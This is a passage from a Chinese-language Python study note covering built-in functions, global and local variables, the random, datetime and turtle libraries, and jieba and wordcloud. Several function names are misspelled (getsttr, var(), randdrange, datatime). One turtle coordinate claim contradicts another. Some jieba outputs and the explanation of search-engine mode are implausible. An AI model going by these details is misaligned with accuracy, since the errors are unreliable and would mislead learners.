<td>hasattr()</td>
<td>检查对象是否含有属性</td>
</tr>
<tr>
<td>getsttr()</td>
<td>获取对象的属性值</td>
</tr>
<tr>
<td>setattr()</td>
<td>设置对象的属性值</td>
</tr>
<tr>
<td>delattr()</td>
<td>删除对象的属性</td>
</tr>
<tr>
<td>callable()</td>
<td>检查对象是否可被调用</td>
</tr>
<tr>
<td>format()</td>
<td>格式化显示值</td>
</tr>
<tr>
<td>var()</td>
<td>返回当前作用域内的局部变量和其值组成的字典，或者返回对象的属性列表</td>
</tr>
</tbody></table>
<h4 id="6-变量操作："><a href="#6-变量操作：" class="headerlink" title="6.变量操作："></a>6.变量操作：</h4><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>globals()</td>
<td>返回当前作用域内的全局变量和其值组成的字典</td>
</tr>
<tr>
<td>locals()</td>
<td>返回当前作用域内的局部变量和其值组成的字典</td>
</tr>
</tbody></table>
<h4 id="10-装饰器："><a href="#10-装饰器：" class="headerlink" title="10.装饰器："></a>10.装饰器：</h4><table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>property()</td>
<td>标示属性的装饰器</td>
</tr>
<tr>
<td>classmethod()</td>
<td>标示方法为类方法的装饰器</td>
</tr>
<tr>
<td>staticmethod()</td>
<td>标示方法为静态方法的装饰器</td>
</tr>
</tbody></table>
<h2 id="4-5-全局局部变量"><a href="#4-5-全局局部变量" class="headerlink" title="4.5 全局局部变量"></a>4.5 全局局部变量</h2><ol>
<li>对于组合数据类型的变量，如果局部变量未真实创建，则是全局变量</li>
</ol>
<p>在Python中，对于可变类型的全局变量（如列表，字典等），即使你在函数内部没有使用<code>global</code>关键字，你仍然可以修改它们。这是因为当你对这些类型的变量执行修改操作（如添加元素，删除元素等）时，你实际上是在修改该变量引用的对象，而不是改变变量引用的对象。</p>
<p>以下是一个示例：</p>
<p>pythonCopy code</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义全局变量</span></span><br><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="comment"># 添加元素到列表x</span></span><br><span class="line">    x.append(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">test()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印x的值，会发现x的值已经被函数test修改</span></span><br><span class="line"><span class="built_in">print</span>(x)  <span class="comment"># 输出：[1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure>

<p>在这个示例中，我们首先定义了一个全局变量<code>x</code>（是一个列表），然后在<code>test</code>函数内部，我们向<code>x</code>添加了一个元素。即使我们没有使用<code>global</code>关键字，全局变量<code>x</code>的值仍然被修改了。</p>
<p>然而，如果你想要在函数内部为全局变量分配一个新的对象（例如，你想要将<code>x</code>指向一个新的列表），那么你仍然需要使用<code>global</code>关键字。否则，Python会认为你在函数内部定义了一个新的局部变量，而全局变量并没有被修改。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义全局变量</span></span><br><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加元素到列表x</span></span><br><span class="line">    <span class="keyword">global</span> x</span><br><span class="line">    x=[<span class="number">5</span>]</span><br><span class="line">    x.append(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">test()</span><br><span class="line"><span class="comment"># 打印x的值，会发现x的值已经被函数test修改</span></span><br><span class="line"><span class="built_in">print</span>(x)  <span class="comment"># 输出：[5, 4]</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>对引用的理解<br>在Python中，变量名其实是对数据的引用，或者你可以把它理解为指向数据的指针。这是Python中名字到对象的引用方式决定的。</li>
</ol>
<p>在Python中，所有的数据都是存储在对象中的，包括数据类型、函数、模块等。每个对象都有一个唯一的标识、类型和值。对于可变对象（例如列表、字典和集合），你可以直接修改这些对象的值，而不改变它们的标识或类型。所以，当你对一个可变对象进行修改操作时，它的标识保持不变，任何引用该对象的变量都将看到这个改变。</p>
<p>例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]  <span class="comment"># a引用一个列表对象[1, 2, 3]</span></span><br><span class="line">b = a  <span class="comment"># b也引用同一个列表对象[1, 2, 3]</span></span><br><span class="line">a.append(<span class="number">4</span>)  <span class="comment"># 修改a引用的对象</span></span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment"># b看到了这个改变，输出：[1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure>

<p>在上面的代码中，<code>a</code>和<code>b</code>实际上是引用了同一个列表对象，当我们通过<code>a</code>修改这个对象时，<code>b</code>也看到了这个改变。这就是因为<code>a</code>和<code>b</code>引用的是同一个对象，它们是同一个对象的两个名字或者说是别名。</p>
<p>另一方面，对于不可变对象（例如整数、字符串和元组），它们的值是不可改变的。所以当你对一个不可变对象赋予一个新的值时，你实际上是创建了一个新的对象，并使变量引用这个新的对象。</p>
<p>例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span>  <span class="comment"># a引用一个整数对象1</span></span><br><span class="line">b = a  <span class="comment"># b也引用整数对象1</span></span><br><span class="line">a = <span class="number">2</span>  <span class="comment"># a现在引用了一个新的整数对象2</span></span><br><span class="line"><span class="built_in">print</span>(b)  <span class="comment"># b的值没有改变，输出：1</span></span><br></pre></td></tr></table></figure>

<p>在上面的代码中，当我们改变<code>a</code>的值时，<code>b</code>的值并没有改变。这是因为<code>a = 2</code>实际上创建了一个新的整数对象<code>2</code>，并使<code>a</code>引用这个新的对象，而<code>b</code>仍然引用原来的整数对象<code>1</code>。</p>
<h1 id="第五章-常见库的使用"><a href="#第五章-常见库的使用" class="headerlink" title="第五章 常见库的使用"></a>第五章 常见库的使用</h1><h2 id="5-1-模块1-math库的使用-需import引用该库"><a href="#5-1-模块1-math库的使用-需import引用该库" class="headerlink" title="5.1 模块1:math库的使用(需import引用该库)"></a>5.1 模块1:math库的使用(需import引用该库)</h2><p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306120929220.jpeg" alt="在这里插入图片描述"><br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306120929221.jpeg" alt="在这里插入图片描述"></p>
<p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306120929222.jpeg" alt="在这里插入图片描述"><br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306120929223.jpeg" alt="在这里插入图片描述"><br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306120929224.jpeg" alt="在这里插入图片描述"></p>
<h2 id="5-2-random库的使用-生成为随机数"><a href="#5-2-random库的使用-生成为随机数" class="headerlink" title="5.2 random库的使用 生成为随机数"></a>5.2 random库的使用 生成为随机数</h2><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>seed(a&#x3D;None</td>
<td>初始化随机数种子,默认值为当前系统数据</td>
</tr>
<tr>
<td>random()</td>
<td>生成一个[0.0,1.0] (不包括1)之间的随机小数</td>
</tr>
<tr>
<td>uniform(a,b)</td>
<td>生成[a,b] (包括b)之间的随机小数</td>
</tr>
<tr>
<td>randint(a,b)</td>
<td>生成[a,b] (包括b)之间的整数</td>
</tr>
<tr>
<td>getrandbits(k)</td>
<td>生成一个k比特长度的随机整数</td>
</tr>
<tr>
<td>randdrange(start,stop[,step]</td>
<td>生成一个[start,stop]之间以step为步数的随机整数</td>
</tr>
<tr>
<td>choice(seq)</td>
<td>以序列类型,例如列表中随机返回一个元素</td>
</tr>
<tr>
<td>shuffle(seq)</td>
<td>将序列列表中的元素随机排列,返回打乱后的序列</td>
</tr>
<tr>
<td>sample(pop,k)</td>
<td>从pop类型中随机选取k个元素,以列表类型返回</td>
</tr>
<tr>
<td>int(random.random() * 6)</td>
<td></td>
</tr>
<tr>
<td>可以返回一个0到5之间的整数</td>
<td></td>
</tr>
</tbody></table>
<p>int(random.uniform(0, 6))<br>可以返回一个0到5之间的整数</p>
<p>random.choice([1, 2, 3, 4, 5, 6])<br>可以返回一个1到6之间的整数元素</p>
<p>random.randint(1, 6)<br>可以返回一个1到6之间的整数</p>
<h2 id="5-3-datatime库的使用-—-标准时间库"><a href="#5-3-datatime库的使用-—-标准时间库" class="headerlink" title="5.3 datatime库的使用 —-标准时间库"></a>5.3 datatime库的使用 —-标准时间库</h2><h3 id="1-datatime-的概述"><a href="#1-datatime-的概述" class="headerlink" title="1.datatime 的概述"></a>1.datatime 的概述</h3><table>
<thead>
<tr>
<th>类</th>
<th>表示含义</th>
</tr>
</thead>
<tbody><tr>
<td>datatime.date</td>
<td>表示日期的类,可以表示 年 月 日</td>
</tr>
<tr>
<td>datatime.time</td>
<td>表示时间的类,可以表示 小时 分钟 秒 毫秒</td>
</tr>
<tr>
<td>datatime.datetime</td>
<td>表示时间日期的类,覆盖上面两种</td>
</tr>
<tr>
<td>datatime.timedelta</td>
<td>表示两个datetime对象的差值；</td>
</tr>
<tr>
<td>datatime.tzinfo</td>
<td>表示时区的相关信息</td>
</tr>
<tr>
<td>datetime.fromtimestamp</td>
<td>可以将⼀定范围内的⾮负整数转换为年⽉⽇时间</td>
</tr>
<tr>
<td>strptime</td>
<td>函数可以实现将字符串转换为⽇期型</td>
</tr>
</tbody></table>
<h3 id="2-datatime的解析"><a href="#2-datatime的解析" class="headerlink" title="2.datatime的解析"></a>2.datatime的解析</h3><p>创建datatime对象的三种方法datetime.now()，datetime.utcnow()，datetime.datetime().<br>1.datatime.now() 获取当前的日期和时间对象,返回datatime.datatime类型,<br>2.datatime.utchow ()获取当前日期和时间对应的UTC时间,返回datatime类型<br>3.datatime()构造一个日期时间对象<br>方法 datatime(year,moth,day,hour&#x3D;0,minute&#x3D;0,second&#x3D;0,microsecond&#x3D;0)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from datetime import datetime</span><br><span class="line">&gt;&gt;&gt; today= datetime.now()      #返回一个datetime类型，表示当前日期和时间，精确到微秒。</span><br><span class="line">&gt;&gt;&gt; today</span><br><span class="line">datetime.datetime(2020, 9, 19, 9, 46, 35, 391262)&gt;&gt;&gt; today= datetime.utcnow()	#返回一个datetime类型，表示当前日期和时间的UTC（世界标准时间）表示，精确到微秒。</span><br><span class="line">&gt;&gt;&gt; today</span><br><span class="line">datetime.datetime(2020, 9, 19, 1, 48, 53, 506101)&gt;&gt;&gt; today = datatime(2020, 9, 19, 1, 48, 53, 506101)</span><br><span class="line">datetime.datetime(2020, 9, 19, 1, 48, 53, 506101)</span><br></pre></td></tr></table></figure>

<p>datatime类常用的属性,创建today为datetime对象:</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>today.min</td>
<td>固定返回datetime的最小时间对象，datetime(1,1,1,0,0)</td>
</tr>
<tr>
<td>today.max</td>
<td>固定返回datetime的最大时间对象，datetime(9999.12,31,23l,59,59,999999)</td>
</tr>
<tr>
<td>today.year</td>
<td>返回today包含的年份</td>
</tr>
<tr>
<td>today.month</td>
<td>返回today包含的月份</td>
</tr>
<tr>
<td>today.day</td>
<td>返回today包含的日期</td>
</tr>
<tr>
<td>today.hour</td>
<td>返回today包含的小时</td>
</tr>
<tr>
<td>today.minute</td>
<td>返回today包含的分钟</td>
</tr>
<tr>
<td>today.second</td>
<td>返回today包含的分秒</td>
</tr>
<tr>
<td>today.microsecond</td>
<td>返回today包含的微秒值</td>
</tr>
</tbody></table>
<p>datatime 对象常用的时间格式化方法:</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>today.isoformat()</td>
<td>采用ISO标准显示时间。</td>
</tr>
<tr>
<td>today.isoweekday()</td>
<td>根据日期计算星期后返回1—-7对应星期一到星期日。</td>
</tr>
<tr>
<td>today.strtime(format)</td>
<td>根据格式化字符串format进行格式显示的方法</td>
</tr>
<tr>
<td>使用方法如下</td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">today= datetime(2020,9,19,10,0,35,397865)</span><br><span class="line">today.isoformat() #运行结果：&#x27;2020-09-19T10:00:35.397865&#x27;</span><br><span class="line">today.isoweekday() #运行结果：6</span><br><span class="line">today.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)#运行结果&#x27;2020-09-19 10:00:35&#x27;</span><br></pre></td></tr></table></figure>

<p>strtime()格式化字符串的数字左侧会自动补零</p>
<p>strftime()方法的格式化控制符表:</p>
<table>
<thead>
<tr>
<th>格式化字符串</th>
<th>日期&#x2F;时间</th>
</tr>
</thead>
<tbody><tr>
<td>%Y</td>
<td>年份 (0001-9999 )</td>
</tr>
<tr>
<td>%m</td>
<td>月份( 01-12)</td>
</tr>
<tr>
<td>%B</td>
<td>月名 (January-December)</td>
</tr>
<tr>
<td>%b</td>
<td>月名缩写 (Jan-Dec)</td>
</tr>
<tr>
<td>%d</td>
<td>日期 (01-31)</td>
</tr>
<tr>
<td>%A</td>
<td>星期(Monday-Sunday)</td>
</tr>
<tr>
<td>%a</td>
<td>星期缩写(Mon-Sun)</td>
</tr>
<tr>
<td>%H</td>
<td>小时（24小时制）(00-23)</td>
</tr>
<tr>
<td>%M</td>
<td>分钟(00-59)</td>
</tr>
<tr>
<td>%S</td>
<td>秒(00-59)</td>
</tr>
<tr>
<td>%x</td>
<td>日期(年&#x2F;月&#x2F;日)</td>
</tr>
<tr>
<td>%X</td>
<td>时间(时: 分 :秒)</td>
</tr>
</tbody></table>
<p>“2022&#x2F;12&#x2F;04 15:38:22”这种形式的当前时间<br>from datetime import datetime<br>print(datetime.now().strftime(‘%Y&#x2F;%m&#x2F;%d %H:%M:%S’))</p>
<h2 id="5-4-python绘制turtle"><a href="#5-4-python绘制turtle" class="headerlink" title="5.4 python绘制turtle"></a>5.4 python绘制turtle</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import turtle</span><br><span class="line">turtle.setup(650, 350, 200, 200)</span><br><span class="line">turtle.penup()</span><br><span class="line">turtle.fd(-250)</span><br><span class="line">turtle.pendown()</span><br><span class="line">turtle.pensize(25)</span><br><span class="line">turtle.pencolor(&quot;purple&quot;)</span><br><span class="line">turtle.seth(-40)</span><br><span class="line">for i in range(4):turtle.circle(40, 80)turtle.circle(-40, 80)</span><br><span class="line">turtle.circle(40, 80/2)</span><br><span class="line">turtle.fd(40)</span><br><span class="line">turtle.circle(16, 180)</span><br><span class="line">turtle.fd(40 * 2/3)</span><br></pre></td></tr></table></figure>

<h3 id="引用函数库方式"><a href="#引用函数库方式" class="headerlink" title="引用函数库方式"></a>引用函数库方式</h3><ol>
<li>import &lt;库名&gt;</li>
<li>form &lt;库名&gt; import &lt;函数名&gt;<br> form &lt;库名&gt; import * (其中* 是通配符,表示所有函数)</li>
<li>import &lt;库名&gt; as &lt;自定义名&gt;<br> 例如:<br> import turtle as t<br> 使用函数式则可以 t.fd()格式引用</li>
</ol>
<h3 id="2-4-turtle库语法元素分析"><a href="#2-4-turtle库语法元素分析" class="headerlink" title="2.4 turtle库语法元素分析"></a>2.4 turtle库语法元素分析</h3><h3 id="2-4-1-绘图坐标体系"><a href="#2-4-1-绘图坐标体系" class="headerlink" title="2.4.1 绘图坐标体系"></a>2.4.1 绘图坐标体系</h3><ol>
<li>初始时,小海龟位于 &#x3D;&#x3D;画布正中央,此处坐标(0,0),行进方向为 <em>水平右方</em>&#x3D;&#x3D;</li>
<li>turtle绘图体系 绝对方位的0度为 &#x3D;&#x3D;画布正右方&#x3D;&#x3D;</li>
<li>turtle坐标系的 &#x3D;&#x3D;原点默认在屏幕左上角&#x3D;&#x3D;</li>
<li>画布设置<br> turtle.setup(width,height,startx,starty)<br> 作用:设置主窗体的大小位置<br> 参数:<br> &#x3D;&#x3D;width:窗口宽度&#x3D;&#x3D; ，若值是整数，表示像素值；若值是小数，表示窗口宽度与屏幕的比例。<br> &#x3D;&#x3D;height:窗口高度&#x3D;&#x3D;，若值是整数，表示像素值；若值是小数，表示窗口高度与屏幕的比例。<br> &#x3D;&#x3D;startx:窗口左侧与屏幕左侧的像素距离&#x3D;&#x3D;，如果值是None，窗口位于屏幕水平中央。<br> &#x3D;&#x3D;starty:窗口顶部与屏幕顶部的像素距离&#x3D;&#x3D;，如果值是None，窗口位于屏幕垂直中央。</li>
</ol>
<h3 id="2-4-2-画笔控制函数"><a href="#2-4-2-画笔控制函数" class="headerlink" title="2.4.2 画笔控制函数"></a>2.4.2 画笔控制函数</h3><ol>
<li><p>turtle.penup()<br> 别名: turtle.pu() , turtle up()<br> 作用:&#x3D;&#x3D;抬起画笔&#x3D;&#x3D;,之后移动不绘制形状</p>
</li>
<li><p>turtle.pendown()<br> 别名:turtle.pd() ,turtle.down()<br> 作用:&#x3D;&#x3D;落下画笔&#x3D;&#x3D;,运动会绘制形状(与turtle.penup()一组)</p>
</li>
<li><p>turtle.pensize(width)<br> 别名: turtle.width()<br> 作用:&#x3D;&#x3D;设置画笔尺寸&#x3D;&#x3D;<br> 参数:width画笔的宽度,如果为None或空,则返回当前画笔宽度</p>
</li>
<li><p>turtle.pencoclor(colorstring)或turtle.pencolor((r,g,b))<br> 作用:&#x3D;&#x3D;设置画笔颜色&#x3D;&#x3D;,无参数时返回当前画笔颜色<br> 参数:colorstring 表示颜色字符串,如”purple”,“red”,“blue”<br> (r,g,b)颜色对应的RGB数值,如(51,204,140)<br> <img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306120930592.png" alt="在这里插入图片描述"><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306120930593.png" alt="部分RGB颜色对照表"></p>
</li>
</ol>
<h3 id="2-4-3-形状绘制函数"><a href="#2-4-3-形状绘制函数" class="headerlink" title="2.4.3 形状绘制函数"></a>2.4.3 形状绘制函数</h3><ol>
<li><p>turtle.forward(d)<br> 别名:turtle.fd(d)<br> 作用:&#x3D;&#x3D;向当前行进方向前进&#x3D;&#x3D; d距离<br> 参数:d行进距离的像素值,当值为负数时,向相反方向前进</p>
</li>
<li><p>turtle.bk(d)<br> 作用:向海龟 &#x3D;&#x3D;负方向移动&#x3D;&#x3D; d距离 &#x3D;&#x3D;(海龟方向不改变)&#x3D;&#x3D;</p>
</li>
<li><p>turtle.setheading(angle)<br> 别名:turtle.seth(angle)<br> 作用:&#x3D;&#x3D;设置海龟当前前进方向&#x3D;&#x3D;angle,该角度为绝对方向角度  (逆时针旋转对应角度)<br> 参数:angle行进方向的绝对角度的整数值</p>
</li>
<li><p>turtle.left(angle)<br> 作用:&#x3D;&#x3D;海龟向左转&#x3D;&#x3D;<br> 参数:angle在海龟当前行进方向上旋转的角度</p>
</li>
<li><p>. turtle.right(angle)<br> 作用:&#x3D;&#x3D;海龟向右转&#x3D;&#x3D;<br> 参数:angle在海龟当前行进方向上旋转的角度</p>
</li>
<li><p>turtle.circle(r,extent&#x3D;None)<br> 作用:&#x3D;&#x3D;根据半径r绘制extent角度的弧形&#x3D;&#x3D;<br> 参数:r半径,当值为正数时,半径在海龟左侧（逆时针）:但值为负数时,半径在海龟右侧.  （顺时针）<br> extent,绘制弧形的角度,但不设参数或设置为None时,绘制整个圆</p>
</li>
<li><p>turtle.done()<br> 作用:绘图完后手动退出,若不加,则程序完成就自动退出(一般都在绘图程序后加此函数)</p>
</li>
<li><p>turtle.speed()<br> 设置画笔速度(0-10),速度越大越快,大于10小于0.5时默认为0,&#x3D;&#x3D;0是最快的速度&#x3D;&#x3D;</p>
</li>
<li><p>turtle.undo()<br> 撤销上一次命令</p>
</li>
<li><p>.hideturtle()<br>隐藏海龟</p>
</li>
<li><p>turtle.showturtle()<br>显示海龟</p>
</li>
</ol>
<h2 id="5-5-第三方库"><a href="#5-5-第三方库" class="headerlink" title="5.5 第三方库"></a>5.5 第三方库</h2><p>2.计算生态。<br>（1）pip 库。三种安装方式（工具安装、自定义安装、文件安装）。<br>（2）PyInstaller 库。参数：Python 源程序文件名、-F、-i、-D、-clean 的功能。<br>（3）jieba 库。中文分词库，三种分词模式（精确模式 jieba.lcut(s)、全模式 jieba.lcut(s,cut_all&#x3D;True)、搜索引擎模式 jieba.lcut_for_search(s)）。<br>（4）wordcloud 库。创建 WordCloud 对象、generate(text)方法、to_file(filename)方法。<br>（5）NumPy 库的简单使用。numpy.array()函数、numpy.arange()函数。<br>（6）第三方库纵览（只要求了解第三方库的名称及分类）</p>
<ul>
<li>数据分析：numpy、pandas、scipy</li>
<li>文本处理：beautifulsoup4、pdfminer、python-docx、openpyxl</li>
<li>数据可视化：matplotlib、TVTK、mayavi、seaborn</li>
<li>机器学习：TensorFlow、scikit-learn、Theano、mxnet、PyTorch</li>
<li>网络爬虫：requests、scrapy、grab</li>
<li>Web 开发：Django、Pyramid、Flask</li>
<li>图形用户界面：PyQt5、wxPython、PyGTK</li>
<li>游戏开发：Pygame、Panda3D、Cocos2d</li>
</ul>
<p>（7）更多第三方库:</p>
<ul>
<li>PIL：图像处理方面的重要第三方库</li>
<li>SymPy：支持符号计算，是一个全功能的计算机代数系统</li>
<li>NLTK：自然语言处理的第三方库</li>
<li>WeRoBot：微信机器人框架</li>
<li>MyQR：产生基本二维码、艺术二维码、动态效果二维码</li>
<li>Loso：另一种中文分词库</li>
<li>SnowNLP：情感分析</li>
</ul>
<h2 id="5-6-jieba-amp-wordcloud"><a href="#5-6-jieba-amp-wordcloud" class="headerlink" title="5.6 jieba&amp;wordcloud"></a>5.6 jieba&amp;wordcloud</h2><h3 id="1-jieba"><a href="#1-jieba" class="headerlink" title="1. jieba"></a>1. jieba</h3><p>jieba 是一个常用的中文分词库，可以用于将中文文本按词语进行切分。jieba 库提供了多种分词模式，包括精确模式、全模式和搜索引擎模式。</p>
<p>下面是关于这三种分词模式的简单介绍：</p>
<ol>
<li>精确模式（默认模式）：<br>使用 <code>jieba.lcut(s)</code> 函数可以对文本 <code>s</code> 进行精确模式的分词，即将文本切分为尽可能精确的词语。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;我喜欢用jieba进行中文分词&quot;</span></span><br><span class="line">result = jieba.lcut(s)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># 输出: [&#x27;我&#x27;, &#x27;喜欢&#x27;, &#x27;用&#x27;, &#x27;jieba&#x27;, &#x27;进行&#x27;, &#x27;中文&#x27;, &#x27;分词&#x27;]</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>全模式：<br>使用 <code>jieba.lcut(s, cut_all=True)</code> 函数可以进行全模式的分词，即将文本按照所有可能的词语进行切分，可能会产生冗余。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;我喜欢用jieba进行中文分词&quot;</span></span><br><span class="line">result = jieba.lcut(s, cut_all=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># 输出: [&#x27;我&#x27;, &#x27;喜欢&#x27;, &#x27;用&#x27;, &#x27;jieba&#x27;, &#x27;进行&#x27;, &#x27;中文&#x27;, &#x27;分词&#x27;, &#x27;中文分&#x27;, &#x27;文分词&#x27;]</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>搜索引擎模式：<br>使用 <code>jieba.lcut_for_search(s)</code> 函数可以进行搜索引擎模式的分词，该模式会对长词进行切分，并返回更多的词语组合。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;我喜欢用jieba进行中文分词&quot;</span></span><br><span class="line">result = jieba.lcut_for_search(s)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># 输出: [&#x27;我&#x27;, &#x27;喜欢&#x27;, &#x27;用&#x27;, &#x27;jieba&#x27;, &#x27;进行&#x27;, &#x27;中文&#x27;, &#x27;分词&#x27;, &#x27;中文&#x27;, &#x27;文分&#x27;, &#x27;分词&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>搜索引擎模式是 jieba 库中的一种分词模式，通过调用 <code>jieba.lcut_for_search(s)</code> 函数可以进行搜索引擎模式的分词。</p>
<p>搜索引擎模式相对于精确模式和全模式，会对长词进行切分，并返回更多的词语组合。这样做的目的是为了提供更多的关键词组合，以满足搜索引擎等需要更全面分析的场景。</p>
<p>下面是搜索引擎模式的使用示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;我喜欢用jieba进行中文分词&quot;</span></span><br><span class="line">result = jieba.lcut_for_search(s)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># 输出: [&#x27;我&#x27;, &#x27;喜欢&#x27;, &#x27;用&#x27;, &#x27;jieba&#x27;, &#x27;进行&#x27;, &#x27;中文&#x27;, &#x27;分词&#x27;, &#x27;中文&#x27;, &#x27;文分&#x27;, &#x27;分词&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>在上述示例中，我们使用 <code>jieba.lcut_for_search(s)</code> 函数对字符串 <code>s</code> 进行分词。结果会返回一个列表，包含了分词后的词语。注意到，在搜索引擎模式中，<code>&#39;中文&#39;</code> 这个词语被切分成了 <code>&#39;中文&#39;</code>、<code>&#39;文分&#39;</code>、<code>&#39;分词&#39;</code> 三个词语，以提供更多的关键词组合。</p>
<p>搜索引擎模式的分词结果可以更好地适应搜索引擎的需求，以及一些需要更全面分析的文本处理场景。它可以提供更多的关键词组合，帮助实现更准确的搜索、信息提取和语义分析等任务。</p>
<p>以上是 jieba 库中三种常用的分词模式的简单示例。根据具体需求选择合适的分词模式可以得到更准确的中文分词结果。</p>
<h3 id="2-wordcloud"><a href="#2-wordcloud" class="headerlink" title="2. wordcloud"></a>2. wordcloud</h3><p><code>wordcloud</code> 是一个用于生成词云的 Python 库。通过 <code>wordcloud</code> 库，可以根据给定的文本数据生成具有艺术感的词云图。</p>
<p>下面是 <code>wordcloud</code> 库的几个重要概念和方法：</p>
<ol>
<li>创建 WordCloud 对象：可以使用 <code>WordCloud()</code> 构造函数创建一个 <code>WordCloud</code> 对象，该对象用于配置词云的各种参数，如字体、颜色、形状等。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> wordcloud <span class="keyword">import</span> WordCloud</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 WordCloud 对象</span></span><br><span class="line">wc = WordCloud()</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>generate(text) 方法：通过调用 <code>generate(text)</code> 方法，可以根据给定的文本数据生成词云图。文本数据可以是字符串类型，也可以是由单词组成的列表。</li>
</ol>
